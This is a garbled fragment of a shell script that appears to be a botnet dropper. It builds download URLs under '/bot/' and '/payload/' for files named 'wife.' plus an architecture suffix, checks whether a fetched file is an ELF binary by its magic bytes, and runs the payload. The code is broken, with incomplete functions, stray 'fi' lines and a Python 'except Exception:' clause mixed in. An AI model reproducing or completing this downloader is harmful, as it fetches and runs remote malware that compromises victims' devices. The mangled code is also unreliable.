    echo "http://$HTTP_HOST/wife.$1"
    echo "http://$HTTP_HOST/bot/wife.$1"
    echo "http://$HTTP_HOST/payload/wife.$1"

    d="$W/wife.$1"

        rm -f "$d"
    fi
    return 1
}


is_elf() {
    [ -f "$1" ] || return 1
    h=$(head -c 4 "$1" 2>/dev/null | od -An -tx1 2>/dev/null | tr -d ' \n')
    
    [ -z "$h" ] && return 0
    [ "$h" = "7f454c46" ]
}

fetch() {

    rm -f "$d"

    rm -f "$d"
    return 1

except Exception:

    "$p" && return 0
    return 1
